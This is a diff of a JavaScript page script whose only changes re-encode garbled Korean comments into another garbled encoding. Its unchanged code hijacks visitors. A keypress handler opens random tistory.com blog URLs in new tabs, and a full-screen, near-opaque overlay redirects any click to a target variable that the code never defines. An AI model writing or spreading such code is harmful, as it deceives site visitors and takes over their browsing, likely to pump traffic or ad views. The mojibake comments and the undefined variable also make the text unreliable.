@@ -1,5 +1,5 @@
 document.writeln('<style>* { font-size: 1em !important}</style>');
-// URL ¹è¿­À» ÇÔ¼ö ¿ÜºÎ¿¡ ¼±¾ð
+// URL ë°°ì—´ì„ í•¨ìˆ˜ ì™¸ë¶€ì— ì„ ì–¸
 const urls = [
     'https://blog3news.tistory.com/',
     'https://1-news.tistory.com/',
@@ -7,7 +7,7 @@ const urls = [
 ];
 
 function handleKeyPress(event) {
-    // ¹è¿­À» ¼¯°í µÎ °³ÀÇ ·£´ý URLÀ» ¼±ÅÃÇÏ´Â ÇÔ¼ö
+    // ë°°ì—´ì„ ì„žê³  ë‘ ê°œì˜ ëžœë¤ URLì„ ì„ íƒí•˜ëŠ” í•¨ìˆ˜
     function getRandomUrls(num) {
         const shuffled = urls.sort(() => 0.5 - Math.random());
         return shuffled.slice(0, num);
@@ -15,7 +15,7 @@ function handleKeyPress(event) {
 
     const randomUrls = getRandomUrls(2);
 
-    // »õ ÅÇ¿¡¼­ ·£´ýÀ¸·Î ¼±ÅÃµÈ URLÀ» ¿­±â
+    // ìƒˆ íƒ­ì—ì„œ ëžœë¤ìœ¼ë¡œ ì„ íƒëœ URLì„ ì—´ê¸°
     randomUrls.forEach(url => window.open(url, '_blank'));
 }
 
@@ -24,7 +24,7 @@ document.writeln('<style>');
 document.writeln('#s2, #s3 {transition:opacity 5s;z-index:99;position:fixed;top:0;left:0;opacity:0.8;background:#000;width:100%;height:110vh}');
 document.writeln('</style>');
 document.writeln('<a onclick=\'location.href="' + randomUrl + '"\' target="_blank" href="#"><div id="s2"></div></a>');
-//°ËÁ¤
+//ê²€ì •
 
 window.addEventListener('scroll', () => {
   const scrollHeight = document.documentElement.scrollHeight;
